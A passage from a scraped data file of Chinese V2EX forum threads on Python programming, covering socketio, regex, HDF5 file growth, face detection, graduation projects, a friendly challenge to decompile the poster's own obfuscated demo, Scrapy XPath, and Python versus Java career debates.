false;\r<br>     };\r<br>\r<br>    socket.on('connect', function() {\r<br>        socket.emit('connect_event',{'data':name});\r<br>    })\r<br>\r<br>    socket.on('serverresponse', function(msgg) {\r<br>        console.log(msgg)\r<br>        $('#loog').append('&lt;br&gt;' + $('&lt;div/&gt;').text(msgg.data).html());\r<br>    });</div>"], "reply": "2", "tittle": "Python 服务端实时持续发送数据给前端无法收到。新人求救！大问题！！", "comment": ["=。=吓得刚准备用 flask-socketio 的我立马去试", "搞定了,\r", "emit 后面加 socketio.sleep(0)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><code>jdbc:mysql://10.0.151.205:3306</code> -&gt; <code>10.0.151.205:3306</code></p>\n<p>感觉用正则会很快，但是不是很懂正则。还有什么特殊的技巧吗？</p>\n</div></div>"], "reply": "19", "tittle": "如何取出其中的 IP 地址", "comment": ["不懂 py 的来打混下\r", "不知道 py 能不能转成 string 再处理……", "split(':')", "如果字符串固定，只是 IP 会不同，那么按照字符串长度截取不失为一种方法", "不是很懂正则就学一下啊， 30 分钟入门教程", "(\\d+?\\.){3}\\d+?\\.:\\d+?", "哎呀多了个点", "匹配 ip 的正则表达式，网上太多了，随便搜一下就是答案", "正则：[\\d{1,3}.]+\\d{1,3}:\\d{4}", "re.match(r'^.+\\/\\/(?P<ip>\\d{1,3}(\\.\\d{1,3}){3}).+$', 'jdbc:mysql://10.0.151.205:3306 -> 10.0.151.205:3306').group('ip')\r", "不能帮助你更多了 :P", "print 'jdbc:mysql://10.0.151.205:3306 -> 10.0.151.205:3306'.split('->')[1].split(':')[0].strip()", "'jdbc:mysql://10.0.151.205:3306'.split('/')[-1]", " 端口号的位数也会变\r", " 说错了，是 jdbc:mysql://10.0.151.205:3306  变成 10.0.151.205", " 额，我以为是 docker 那种端口映射关系的字符串", "  搞定了，感谢。 print '''jdbc:mysql://10.0.151.205:3306'''.split('/')[-1].split(':')[0]", "我也来个不用正则的 标准库 urlparse \r", ">>> import urlparse\r", ">>> a = 'jdbc:mysql://10.0.151.205:3306'\r", ">>> urlparse.urlparse(urlparse.urlparse(a).path).hostname\r", "'10.0.151.205'", "这样也可以的 记住 split rsplit lsplit 是一组函数 他第二个参数非常有用的\r", "\r", ">>> a.rsplit(':', 1)[0].rsplit('/', 1)[-1]\r", "'10.0.151.205'", ">>> ip_data\r", "\r", "'jdbc:mysql://10.0.151.205:3306'\r", "\r", ">>> rule\r", "\r", "'.*//(?P<ip>\\\\d{1,3}.\\\\d{1,3}.\\\\d{1,3}.\\\\d{1,3}:\\\\d{1,5})'  #端口号有五位数的啊\r", "\r", ">>> re.match(rule, ip_data).group('ip')\r", "\r", "'10.0.151.205:3306", " nice"]},
{"content": ["<div class=\"topic_content\">Python 程序调用了一些 c++导出的函数，这些函数大多会访问网络，会阻塞等待。\r<br>\r<br>因为一些原因，现在无法修改那部分代码，所以我考虑用 thread ／ gevent 来在 python 里面实现异步操作。\r<br>\r<br>直接把处理函数丢给 thread/gevent 里面去处理，这样主线程 UI 也不会阻塞住，在处理完成后，通知主线程去处理数据结果。\r<br>\r<br>对 Python 不熟，请问有什么更好的方法吗？</div>"], "reply": "6", "tittle": "同步调用等待的代码修改成异步执行", "comment": ["1.C 代码是用不了 gevent 的。 gevent 是套住 Python 的 IO 操作\r", "2.thread 大概没问题", "豆瓣开源了一个叫 greenify 的项目，直接二进制打 patch,你可以试一试", "如果导出函数不是异步操作 Gevent 管不了，想要解决这个只能用 C 去 call Gevent 的 API", "用 Cython nogil 模式调用 C++ 函数，然后在 Python 这边可以用 threading 来调用这个 Cython wrapper", "Using C++ in Cython ： ", "\r", "\r", "Releasing the GIL ： ", "跟我想的差不多，丢到线程里面去处理来解决。\r", "\r", "有一个封装好的包 multitasking\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我自己本身是做 java 开发的，因为爬虫才了解到 python,然后对 python 一发不可收拾。自学了很多关于 python web 的知识，最近想转 python web 。但是我在拉勾上发现 python 的工资并不高（忽律北京），对于 3-5 年工作经验的 python 开发者，低于同经验的 java 开发者，超过 25k~50k 的 python 岗位很少，但是 java 的岗位却一抓一大把。同样的， java 开发转做架构师的容易， python 即使做成了架构师也难找到岗位，因为没有多少家公司使用 python （二线城市）。 python 最近比较火在于数据挖掘和机器学习。除此，在 web 上的前景似乎真的不如 java?不知道大家学习 python ，或者想要从事 python web 开发的有没有这样的顾虑？</p>\n</div></div>"], "reply": "63", "tittle": "Python 的前景到底有多大？如果不考虑数据挖掘和机器学习？", "comment": ["不如 php", "7 年 python 开发的人来答一下，如果你打算继续做后台开发，用 java ，如果想做大数据平台，用 java ，如果想做数据分析这些，可以考虑 python", "  所以我还是应该坚持走 java 路线。", " 就单单从 web 方向看来，它真的不适合更深远的发展！", "小林可是用 python 养活了一家四只龙呐，前景大大滴~！", "  怎么说？", "前景与语言无关", "刚转 python 的游戏开发者觉得 python 挺好用的~", "所有服务器都预装 python ，你觉得呢", "钱景，还是自己做老板 /做生意 /投资 /炒房，更好啊...", "这得看你啥时候买入学区房。其他的都是空谈。", " 虽然都装了 python ，但用的最多的也只是运维吧。拿来做 web 的还是太少了", " 我只是关注 python 在 web 方向的前景，因为我想往架构方向发展！", "纯做 web 只有自己做事情。语言不是问题，有解决问题的能力就好。大公司一个萝卜一个坑，如果卤煮想当萝卜的话最好换个坑， python 的 web 坑确实是没有啦", "做 web 传统的运营系统 一般都是 Java 毕竟成熟 市场摆在那里，\r", "架构师不会放着成熟的框架以及后端生态不用 转用一些新出的东西\r", "python 一般互联网公司用得比较多", "Python 堆启动项目阶段的功能，快速堆功能占领市场。\r", "真有业务瓶颈就先堆服务器。\r", "\r", "如果运气好做大了，考虑到要省钱或者碰上重 CPU 的业务。\r", "看团队愿意学 golang 的多不多：\r", "多的话培养点内部核心员工转 golang 去把性能瓶颈的业务代码转成 golang ，好多 Python 启动的项目都走这条路线，似乎是 Python 开发人员比较愿意学习 golang ？\r", "不多的话大量招 Java 进来用 Java 做性能或者复杂业务的模块开发。 Python 启动的电商项目喜欢这么转，毕竟可以挖阿里的人，试错成本低。\r", "\r", "Java 是在大量开发人员共同开发项目的时候，工程规范化轮子最多的语言，只要少量的架构人员写好工程规范的约束，就可以快速扩张开发人员了。\r", "而且在大数据处理领域， Java 的轮子最完善。", " 感谢，你的回答对于 python web 开发者发展是个比较好的建议！其实说到底就是考虑到项目发展，以及数据处理方面，还是要转向 java 比较好！", " 大多数互联网公司都集中在北京等一线城市，二线以及二线以下少之又少。所以 python 在这些城市难发展！", "关于我刚好遇到了职业瓶颈问题，感触较多，这里就多答 2 句吧。\r", "做后台开发，不论传统行业，还是互联网公司，最好选 java ，因为各大公司都会用这个语言，后台的解决方案也很成熟， spring, dubbo, zookeeper, elasticsearch, hbase 等等，大家都用这一套经过验证的东西，你再 java 上的任何积累都会为你的职业生涯加分，而且 java 的薪酬天花板很高，选择多！\r", "反观 python ，在 V2EX 上感觉比较火，那是因为基本都是创业公司在用，待遇肯定不会超过 30 万的，你工作了 3-5 年（或者 7-8 年）后吧，想着待遇怎么也得年入 40-50 万了，你会尴尬的发现你简历没地方可投", "python 和 java 完全不在一个档次，也就 v2 这种小众网站喜欢拿 python 来装逼， python 先赶超 php 再说吧。", "一般后台 C++/Java ，大数据场景 Scala ，内核 C\r", "Python 以上都可以做，但都不是 best solution", " 对，我就是在拉钩上看到月薪超过 5 万的 python 岗位二线城市几乎没有，而 java 到很多。而 5 万月薪的，基本就是 5 年以上工作经验，也就是说 python5 年后就没有可上升空间了！", "看我给你分析一下\r", "java java 添砖加瓦 说明 java 才是大型应用的基石\r", "j2ee 捷途易易 说明 j2ee （虽然大家都 springmvc 了）是 web 开发的优秀选择\r", "\r", "--------------------\r", "上面是灌水的\r", "下面一点，\r", "为什么选择 golang 不选择 c++呢？以前 erlang 做高并发给出的解决方式就是没有变量，没有变量就不会有锁，不检查锁自然并发就上来了\r", "\r", "py 还是小众中的大众，跟大流的用 java ，有钱的用 m$的东西，前端的喜欢 nodejs ，赶时髦的在用 erlang 、 golang ，还一部分老的情怀用户在 ruby ，反倒感觉 python 这个不错的东西被孤立了\r", "当然我感觉 python 作为脚本还是很优秀的，作为大型开发还是少了什么，我记得有人给 python 提 issue 想加 interface ，被拒了？", " 所以，我得悬崖勒马，不然真的毁一生！ python 只能作为第二语言", "学个语言有什么好纠结的, 又不是需要花好几年读博士.", " 虽然这个问题是问 python 与 java 哪个好，其实更深入的想表达职业规划的问题。请看 19 楼评论，你就知道了", "云计算，我用 python", "  小林在办公室里公然女装  你行吗？", " 小林家的龙女仆", "我相反, 我一直在写 python, 主要是不喜欢 java, 但准备再捡起 java ...", "工资多少不在于用什么语言，在于你用它做什么事。 web 工程师赚的是对 Web 这块的了解，机器学习工程师赚的是对机器学习的了解。", "别这样，楼主。 我还正在学 python 的路上呢。这不是不让我学了的节奏嘛。", " 我已经花了大半年在 python 上了，准备找 python 工作的时候，发现了这样的问题！", "没什么好纠结的，喜欢就干，爽完了就走，\\滑稽的逃走", "python 毁不掉你的一生，毁掉你一生的是你的学习能力", "前景和语言有什么关系？", "python 号称瑞士军刀，什么地方都可以掺和一下，又简单易学，这个才是它最大的优点。如果只是 web 开发，我想不到它的优势", "python 容易学，所以门槛低，给人打工的市场价格也不高是自然的。除非你写个 facebook ，或者自己有点想法。", "我的看法是，用 python 很不错，但是需要搭配一门语言一起用，比如 c 语言， python 本身能干的事情很少", " 无法反驳", "我 Python 和 php 都是入门，不过 python 貌似最近很火，估计是因为语言比较简洁，比较容易使用。", "大城市来说， java 机会多，竞争也多， python 相反，小地方别玩小语种", "web 上好像还是干不过 PHP ，其实也还好， django 熟练的话很快用各种组件堆出一个网站。不过我更偏向用在其他方面，比如写些小脚本和桌面应用开发。 pyqt 很不错", " 有理，感谢！", "刚毕业就 java 火热，没想到，这么多年过去了，还是 java 火热，而且好像越来越火，公司大了，都去 java 。。。", "量化用的多", " 这门语言在中国存在的意义太大了。", " python 在金融与数据科学上用的多。然后这些又需要很深的数据金融基础，如果从事 web 的话，其实很难往那个方向转。", "行业才谈前景，语言只是工具", " 实际上，国外也是吧", "有不少愿意给员工开高工资的企业，要求都是要你学啥语言你就去学啥。\r", "很可能公司现有的系统是用 Shell+Java+Python+Scala+Cpp 写的，然后把你招进去是让你用 Elixir 和 Ruby 和 PHP 写新系统。", " 其实我的顾虑就跟 19 楼一样， 5 年以后，我如果 python 技能点满，可是我却找不到工作了，因为没有多少家公司真的在用 python 。即使有也仅仅是把 python 当做胶水，协助做点事。", " 容易学的是 PHP 吧，最简单了", "二线城市，别玩什么小众。天花板很低。 JAVA 玩熟了就直接升级架构师。如果想做全能型庸才，那就祝好。理想和现实有区别。\r", "\r", "我 iOS 入手，搞了几年基本熟悉了（ CT ， CA ， CF ），然后从一家做企业 IM 离职后，发现做 APP 没啥难度了。\r", "然后搞了一段时间 PY ，发现 py 根本没啥岗位。\r", "期间创业，因为没人所以逼着自己学了 PHP ，发现 PHP 约束不强各种$ 不习惯，然后了解了下基本在 12~15k ，弃坑。\r", "后来就转 JAVA ， 一个人搞了 2 个后端项目，发现 JAVA 还是不错，准备后面做做架构，搞搞大数据。\r", "坐标 西安。", " 感谢，中肯的建议！", "5 年经验现在月薪 5 万吗？教练，我要学 java", " php 就业前景不好？", " #58 拿高工资的很少，在二线城市。", "用我自己的工作经验来谈，我 70%开发用 python\r", "\r", "python\r", "大企业：主要用来运维开发和机器学习\r", "小企业：用来做 web apiserver 居多，甚至有些用来支持网站大部分后端\r", "\r", "优点： 开发效率高，语言易读性强，胶水语言\r", "缺点： 普遍性能较差（我说的是使用方式，不是语言性能）， 2 与 3 相差大难兼容，软件侧 python 客户端支持不完善（ memcached ， redis ， hbase 等）\r", "\r", "一定要选的话，建议你可以用 python 写脚本研究机器学习，职业上以 java 为主，可以往 hadoop 大数据方向靠拢，毕竟是趋势", " 很高是什么概念", " 感谢您的建议！", "感觉现在 python 的岗位确实不多，主要是就是自动化运维还有数据分析，爬虫脚本类，本人做了 3 年的 web 开发，也接触了 php 开发，感觉还是 python 好用些，不过由于国内很多大厂都是 php,c,java,导致很多出来做 cto 的默认选型会是这些语言，感觉语言本身没有好坏之分，只有合不合适，多学点没坏处，现在觉得还是需要去增加自己的 c 和 php 和 java 之间的阅历，更多的是多学习一些底层的东西。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码是一样的，但是 windows 下二值化后线条比较粗， deepin 下二值化后线条较细。这是为什么？</p>\n<p>windows 下:\n<img src=\"http://pic.027cgb.cn/20170310/20173316182639827.png\">\n<img src=\"http://pic.027cgb.cn/20170311/2017336572060885708.png\"></p>\n<p>deepin 下:\n<img src=\"http://pic.027cgb.cn/20170310/201733954257683019.png\">\n<img src=\"http://pic.027cgb.cn/20170311/201733891444954773.png\"></p>\n</div></div>"], "reply": "4", "tittle": "windows 和 deepin 下图片二值化代码相同，结果却不同。", "comment": ["系统不一样\r", "这就变成讨论系统了", "这样子明显原图都不一样啊。。一个 g 是正的一个是歪的（原图粗细也有可能不同）。。。原图能否展示一下呢。。。", " 我又去试了一下，结果发现只有以前下载的图片才会又这样的现象。即使我用代码同时在两个平台上下载图片，发现二值化后的线条也是细的。现在我没办法知道之前的图片和现在的图片为什么用相同的代码下载会有不同的结果。", " 因为原来的代码下载图片二值化后也是和 deepin 下一样的结果。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT ，</p>\n<pre><code>h5 = pd.HDFStore('test_c4.h5','a', complevel=4, complib='blosc')\nfor tpath in files[:5]:\n    code = tpath.split('\\\\')[-1][:-4]\n    data = pd.read_csv(tpath, encoding='gbk')\n    \n    \n    h5['min1'+code] = data\nh5.close()\n</code></pre>\n<p>上面这个是代码，当 h5 文件未创建时，这段测试代码生成的 H5 文件大约是 5M 左右，但当重复执行这个代码，其内部的 keys 并未发生变化，每一个主键下的数据大小读出来之后发现也没有变化。</p>\n<p>但是文件大小确实在增加，每次增加 1~2M 。难道是垃圾信息吗？好奇怪，第一次用 HDF5 。</p>\n<p>==============\n另外，这个HD5文件也太大了。测试中的前5个文件平均每个csv文件100k左右，存储为hdf5之后，增加了10倍？</p>\n</div></div>"], "reply": "14", "tittle": "请教：为何重复执行时， HDF5 文件会越来愈大？( Python )", "comment": ["打开方式是'a', 跟 python 打开文件的模式'a'是一样的", " 是的。我是在测试追加来着。但实际上，并没有追加，只是把这个主键重新赋值了。从读取的数据上检查过。\r", "\r", "而且，我做新的测试，就是 remove 所有的 keys ，使用 hdfview 查看确实数据都没有了。但是文件大小还是很大。", "你来这问对地方了,hdf5 是不会释放已用空间的,每次新增数据,都会重新申请一次,一个比较简单的解决方法是用自带的工具重新打包一下,叫做 ptrepack <新文件> <源文件> ,新文件的大小就是重新计算过的", " 感谢你。\r", "刚试了下，\r", "原始文件 1.5M ，没加任何参数的情况下， out.h5 大小为 2.2M 。。\r", "压缩方式上貌似没有 zlib?", "当然可以修改压缩级别啊\r", "ptrepack -h \r", "\r", ".....\r", "  --complevel COMPLEVEL\r", "                        set a compression level (0 for no compression, which\r", "                        is the default)\r", "  --complib {zlib,lzo,bzip2,blosc,blosc:blosclz,blosc:lz4,blosc:lz4hc,blosc:snappy,blosc:zlib}\r", "                        set the compression library to be used during the\r", "                        copy. Defaults to zlib", " 3Q ，确实问对地方了。\r", "    ptrepack --complib=zlib test_c4.h5 --complevel=9 out.h5\r", "ok.\r", "\r", "还发现了一个问题，请教一下，是不是数据越多，在 put 的时候就越慢？感觉效率不够呀。\r", "越来越慢", " 我感觉挺快的啊,几百万的读写数据都是毫秒级别的,它本身就是个内存型的操作", " 除非你逐条插入,推荐先用 pandas 组装好数据再保存", " 是这样的，原始文件是大约 3000*255 个 csv 的股票订单数据，\r", "\r", "多进程>>>\r", "\r", "处理函数(文件路径)：\r", "读入一个文件，\r", "处理为分钟数据，\r", "进程锁开\r", "塞入 hdf5\r", "进程锁关", "HDFStore 自带文件锁,如果你在一个进程中打开,另一个进程是无法修改当前 hdf5 数据库的", " 那会报错吗？还是等待写入？如果报错的话，还是需要自己处理的哈，不然的话有的进程就写不进去了。", " 高手你好，我还有一个问题哈，就是存储的模式上，是所有数据都怼到一个表里好，还是分表保存（一个代码的数据一个表这种）", " 同时，我尝试了一下在 put 的时候指定 data_columns ，发现存储速度在下降，文件大小增加了将近一倍。\r", "\r", "这种情况就很尴尬了。\r", "每个 code 的数据单独存放，不用指明 index 和 data_columns 读取很快，可以读出来在内存里进行检索。唯一的问题就是通过 XX.keys()来获取所有表名会很慢。是否可以通过单独建一个表存放表名。嘿嘿。\r", "\r", "所有 code 数据都存放到一个表里的话，为了检索，就必须使用 data_columns ，否则所有数据都读入内存的话既不科学又撑不住。\r", "\r", "\r", "不知大神有什么好的思路？", " 咦,居然还在.我也是浅度使用而已,刚好碰到了你碰到过的问题哈,其他的你还得自己摸索~"]},
{"content": ["<div class=\"topic_content\">求各位大佬给点思路，有很多张图片，全部都是风景照，和人的自拍照，有什么方法可以把里面把人的自拍照片筛选出来吗？</div>"], "reply": "20", "tittle": "怎么识别图片中是否有人像？求思路", "comment": ["这个应该有很多现成的库或者 API 可以做吧...", "很多图像识别库都有现成的例子吧。。", "Keyword: 人脸检测", "iOS 的 Core Image 就包含人脸检测功能，第三方开源库有 Dlib ， Open CV", "最近在看 DLib ，有 python API", "\r", "\r", "Amazon Rekognition is a service that makes it easy to add image analysis to your applications. With Rekognition, you can detect objects, scenes, and faces in images. You can also search and compare faces. Rekognition ’ s API enables you to quickly add sophisticated deep learning-based visual search and image classification to your applications.", "不知道 LZ 说的人像是不是人脸。\r", "\r", "opencv 就能用，自带的。无需训练，开箱即用。\r", "\r", "如果找得到人脸的话，会返回人脸、眼睛、鼻子、嘴的矩形。", "又拍云的人脸识别功能，能够通过 URL 访问图片时，对图片进行识别。任务以同步的方式处理，处理完成后，响应信息中返回人脸识别的信息。\r", "具体了解可以看下:http://docs.upyun.com/cloud/face_detect/#_7", "全部上传 Google Photo 然后搜索 people", "再贴下链接:http://docs.upyun.com/cloud/face_detect/#_7", "同 8 楼 opencv 可以做这个事而且有训练好的模型，也有 py 包，教程详见\r", "dlib 的误判率比 opencv 好，几行代码就可以搞定了", "\r", "\r", "中科院山世光老师开源的 Seetaface\r", "开源库里的一股清流，我司最近刚用这个替换了旧有算法，国人骄傲，效果很好。", "face++", "深度学习库 keras ，分分钟写一个", "若楼主使用 c/c++ 可以参考一下这篇文章： ", "16 楼说的 face++ 挺好用的  人脸识别"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近老师在催毕设进度，花了几天赶制了一个</p>\n<h3>项目地址：</h3>\n<p><a href=\"https://github.com/MagicDu/wpspider\" rel=\"nofollow\">https://github.com/MagicDu/wpspider</a></p>\n<h3>wordpress 博客示例：</h3>\n<p><a href=\"http://itfin.magicdu.cn/\" rel=\"nofollow\">http://itfin.magicdu.cn/</a></p>\n<p>求各位大神指导一下，有什么要改进的内容，或者有什么关于毕业设计的建议</p>\n<p>ps ：小站请勿攻击</p>\n</div></div>"], "reply": "65", "tittle": "写个爬虫往 wordpress 发文章当毕业设计是不是有点勉强 ：)", "comment": ["我觉得 ... 是有点勉强。", "就代码量来说，有点少。毕业论文咋写啊。。", "看你什么学校，老师什么要求了，你这个需求懂的人确实感觉勉强，不懂的人（别告诉他们用 wp ）：\r", "\r", "”我草，你做了个这么漂亮的网站，后台居然这么复杂，牛逼“\r", "\r", "不是我夸张，但是现在有些大学老师除了自己教那点东西之外什么都不了解。", "勉强么？用 matlab 做个 qpsk 仿真都能本科毕业，只要你论文凑得够字数\r", "\r", "毕业论文干啥的没有，做程序的、做调研的、给老师做课件的", "觉着二本及以下大学本科足够了，注意界面美化，再扯上高大上的理论，优秀毕业设计不是梦。", " 我已经尽我所能冗余了一些代码了", "我觉得 ... 有点勉强", "看学校，我们学校更烂的都可以", " 全部用标准库实现试试 ←_←", "这算啥，我同学毕业设计项目为《梦三国-从注册到创建人物》，关键是老师给他过了，也算是互联网相关的毕设啊", "我这是大专~", " 嗯，这个想法好 QAQ", " #10 66666", "起个好听的题目  比如自动新闻采集汇总系统", " 我是不是该找个 UC 或者今日头条的人来给起毕设题目啊 😄", "听说过学校有人用 Excel 处理下数据吹一波就过了的……", "对，起个好名字，α智能信息收集系统——新闻篇", "给新闻再加个权重，立马就高大上了。 \r", "\r", "热点新闻分析系统。\r", "社会舆论采集与分析系统。\r", "\r", "就本质而言，其实所有的聚合类所做的事情，和你这个没有区别的。", "取决于你的毕业论文，只要敢吹，一个全新安装的 WordPress 都能吹出一个省级项目来", " UC 今日头条那套 V2 都会\r", "\r", "《震惊，大学生设计大数据高并发安全可靠实用美观的一站式自动化新闻采集归类发布系统，教授们赞不绝口，称其为中国的年轻乔布斯》", "直接问导师，导师会告诉你行不行。。", "分布式舆论采集分析系统。", "看你们学校导师的水平了。 我当时随便吹个数据库加密 虎的导师一愣一愣的。。", " 这波 6666 ，我服！", "用一大篇扯 wordpress 的原理和发展.妥妥优秀", "瞎扯就行啦", " 就服你啊", "分布式大数据分析与采集系统", " 6666666666", "现在的大学老师，一部分人实在是太水了，前沿的东西一点不懂，每天看几篇朋友篇里发的文章就以为自己跟得上形势了，掌握的还是一二十年的那一套，说句不好听的就是误人子弟。关键是还没法与他们交流，拿身份压人。。（毕设经历过这些）", "毕业设计都这么屌～ 差距呀", "调用个 nlp / ml 做个文摘，推荐 blabla ，再多花半个小时，毕设就高端的飞起来", "给这个爬虫做个配置 config 的后台，可以在 web 端添加自定义规则", "看学校吧 一般都很松", "毕业设计是个啥? 写篇论文不就行了吗 [doge]", "我当初爬微信公众号，用搜狗的 api....特别简单。。而且格式好处理。。各种分类你根据搜狗的分就好了。。\r", "\r", "985 211 就当我没讲", "挺好啊，比较实际。除了有些强校的计算机专业，不过本科毕业设计还能有多高的要求。更多的是一波吹牛逼的很虚的“学术产品”。楼主做这么实在的，倒是有可能格格不入。遇到迂腐的或者不懂的，优秀可能比较难获", "不过->不然", " #38 活捉！", "用 wordpress 显得有点 low 了，你应该用 Djiango 撸一个，或者自己写个框架", "某学长毕设\r", "\r", "vs2015 ", " 默认项目\r", "将英文修改为中文，成功毕业", " 抱住ʚ⠒̫⃝ɞ", "太 low 了，其实你应该对你爬来的数据分析一下马上就高大上了，说爬来的文章投资有可靠什么的，通过机器学习和语义分析推荐靠谱投资股票", "看学校层次，我毕业的时候有一半同学都是做个网站，还比你的烂，都毕业了。", "上面都在说别人，我来自我检讨一下……\r", "上学期末的实践作业，我就是靠说得比唱得好听，拿下了据说是班里唯一的好判定……\r", "（那会儿实在没精力认真做了，南无胡阿门克巴）", "我正在做的毕业设计，让我想死的感觉都有", "想想今日头条就不勉强了", " 这才是真正的明白人，严进严出，才是真正的名校。", "我在英国 2006 年的 本科论文:  中国象棋 Chinese Chess   \r", "软件下载:  ", "帝都某 985 的表示当年毕设分配的题目是一个物流管理系统，现在一想随便找个 CMS 框架搞搞就行了，那会儿不懂。", "网页左下角：\r", "NewsPlus is an all purpose WordPress theme designed for online magazine, technology blog, news and editorial ventures. The theme is fully responsive, retina ready, and supports proportional layout scaling. Key features include language localization, optimization for SEO and Micro-Formats, RTL support, visual short-codes, custom templates and much more.\r", "至少交上去之前把这个改掉，老师再水，这点英文应该是懂的。", "今年老师不想带毕业设计让我们带，，，我给的第一个题目就是拿 Flask 弄个博客，第二个题目就是爬数据来展示，美其名曰“基于网络爬虫的热点新闻获取及可视化系统的设计与实现”。。。", "我为了将(爬虫)文章导进博客，就自己写了个博客，顺便摆脱了世界最好语言的束缚，可以运行在超低端的 vps 和 gae 上了\r", "→_→", "不用 xml-rpc 库，构造个内容也就一个请求搞定的事，做毕设真的合适吗？\r", "要不还是从爬虫上下功夫，思考一下架构，多适配些网站，做好监控页面，再参考前面多少楼起个高大上的名字？", "大二时候 Web 开发课的期末作业就做了一个 wordpress+爬虫的自动聚合新闻站。", "本科毕设只要老师说行 再水都没问题", "学校老师又不懂啥，自己会的那点东西都老掉牙了，过时了，混混过去 SO", "可以了。只要你的程序是真正能跑起来的，水平就已经超过一半的人了。\r", "说到爬虫，分享下个 Python 爬虫的文章 ", "我们班有个同学，毕设答辩的时候场下的老师表示听不懂在讲什么 太高深了", " 感谢分享。", " 不客气~", "可以有一段思考人生的冗余代码  （逃", "1.看学校层次，看导师认不认可\r", "2.看论文怎么吹，侧重点是爬虫还是 WordPress 的展示", "嘿嘿，吹唄，现在都是靠这个。往大数据，宏观上凑。", "吹得好就是大数据，吹的不好就是一个 POST 请求"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>昨天看见 <a href=\"https://www.v2ex.com/t/344055\" rel=\"nofollow\">最近用 Python 写了个工具，有没有什么办法防止被反编译</a> 讨论 Python 源码保护的问题。</p>\n<p>结果显而易见如帖子 33 楼说的：没什么办法能够完全阻止反编译。给予足够的付出，任何程序都可以逆向出来</p>\n<p>但是略微提高些反编译的门槛的小方法还是有的，现在将一个加密代码用这个办法写了个小 DEMO ，欢迎各位尝试反编译，将此 DEMO 加密后的值: 3518d7401d60a79a22f326ada22f116d 进行解密。</p>\n<p>DEMO: <a href=\"https://pan.baidu.com/s/1nuMV5Ip\" rel=\"nofollow\">https://pan.baidu.com/s/1nuMV5Ip</a></p>\n<p>加个小彩头吧～ 第一个给出反编译方法的 支付宝 10 块钱 (穷那...</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>可能感兴趣的同学都尝试了一下，不知道思路如何，我说说我的方法吧</p>\n<p>common.pyc 可以直接反编译，这个很简单，但是里面又套了一层 zlib 解压后的对象， marshal.loads() 后是一个 code object</p>\n<p>很多朋友到了这步可能就被卡住了，其实没有什么难的... 这里的 code object 可以直接导出 pyc 参考 <a href=\"https://segmentfault.com/q/1010000003052356\" rel=\"nofollow\">示例</a></p>\n<p>然后将导出的 pyc 再次反编译就可以得到源码了。</p>\n</div></div>"], "reply": "16", "tittle": "Python 有没有什么办法防止被反编译", "comment": ["CC 昨天的楼主 @", "\r", "\r", "对啦，补充一下，方法直接发楼里就好，反正不是什么严谨的比赛 : )", "用 ctypes 调用就行吧", "from Crypto.Cipher import AES\r", "import base64\r", "import sys\r", "from Crypto.Cipher import AES\r", "from binascii import b2a_hex, a2b_hex\r", "\r", "class prpcrypt:\r", "\r", "    def __init__(self):\r", "        global ak\r", "        ak = 'gxu'\r", "        self.mode = AES.MODE_CBC\r", "        self.accs()\r", "        self.eaf()\r", "        self.afd()\r", "        self.fds()\r", "\r", "    def accs(self):\r", "        global ak\r", "        ak += 'isCc'\r", "\r", "    def eaf(self):", " #3  ", "   真快啊，方法是对了的，但是需要解密上面的 token", " 可是解这个跟这个加密有什么关系 V2EX plus", " #5 这样好给你发个小红包呀... 毕竟上面这样写的，你加我微信吧， id 名", "不用，大家技术交流而已，哈哈，也算是学习一下", "研究过一段时间，最终使用 ctypes 将 py 转为 c ，然后 gcc 编译为.o ，入口文件 import .o 就可以了", " #8 实际上有简单些的方法", " 请教下，烦请告知方法哈", "我有个安全相关的工具,因为 py 容易被反编译,结果最后改成 go 来做,效果不错...", " #10 着急的话，微信加我 id 我们讨论下，不着急的话，我晚上在附言也说说我的方法", "使用定制的 python 主程序，这样别人的反不出你的代码了。但其实也就是增加别人的时间成本罢了。", " #10 我的思路已经补充到附言了", " 使用 ctypesgen ?", " cython"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>&lt;table class=\"tabledataformat\" cellspacing=\"0\" &gt;\n\t&lt;tr&gt;\n\t\t&lt;td style=\"vertical-align:top;\"&gt;Copper, Cu&amp;nbsp;&lt;/td&gt;\n    \t&lt;td class=\"dataCell\" style=\"vertical-align:top;\"&gt;&lt;= 0.03 %&lt;span \t\t     class=\"dataCondition\"&gt;&lt;/span&gt;&lt;/td&gt;\n    \t&lt;td class=\"dataCell\" style=\"vertical-align:top;\"&gt;&lt;= 0.03 %&lt;span class=\"dataCondition\"&gt;&lt;/span&gt;&lt;/td&gt;\n    \t&lt;td class=\"dataComment\" style=\"vertical-align:top;\"&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n&lt;/table&gt;\n</code></pre>\n<p>response.xpath('//table[@class=\"tabledataformat\"]/tr').extract()\n只能获取到</p>\n<pre><code>&lt;tr&gt;\n\t\t&lt;td style=\"vertical-align:top;\"&gt;Copper, Cu&amp;nbsp;&lt;/td&gt;\n    \t&lt;td class=\"dataCell\" style=\"vertical-align:top;\"&gt;&lt;/td&gt;\n    \t&lt;td class=\"dataCell\" style=\"vertical-align:top;\"&gt;&lt;/td&gt;\n    \t&lt;td class=\"dataComment\" style=\"vertical-align:top;\"&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n</code></pre>\n<p>&lt;= 0.03 % 和 <span></span>消失不见，为什么呢？</p>\n</div></div>"], "reply": "4", "tittle": "Scrapy xpath 匹配不到一些数据", "comment": ["因为<=的写法不符合 xml 标准", "这部分数据可能是 javascript 异步请求显示的，也就是 ajax 内容， scrapy 是看不到的。", "'''\r", "<tr>\t\t<td style=\"vertical-align:top;\">Copper, Cu&#160;</td>    \t<td class=\"dataCell\" style=\"vertical-align:top;\">&lt;= 0.03 %<span class=\"dataCondition\"></span></td>    \t<td class=\"dataCell\" style=\"vertical-align:top;\">&lt;= 0.03 %<span class=\"dataCondition\"></span></td>    \t<td class=\"dataComment\" style=\"vertical-align:top;\"></td>    </tr>\r", "'''\r", "\r", "测试 lxml 能输出， scrapy 应该也没问题，查看 html 源码吧", "scrapy 爬下来用 beautifulsoup 处理，我觉得方便些"]},
